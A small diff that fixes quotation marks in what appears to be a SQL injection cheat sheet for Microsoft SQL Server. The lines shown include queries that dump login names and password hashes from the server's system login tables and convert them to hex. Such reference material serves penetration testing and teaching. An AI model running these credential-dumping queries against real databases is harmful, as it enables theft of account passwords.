@@ -96,7 +96,7 @@ SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Nee
 
 MSSQL 2005
 SELECT name, password_hash FROM master.sys.sql_logins
-SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
+SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
 ```
 
 ## MSSQL Union Based
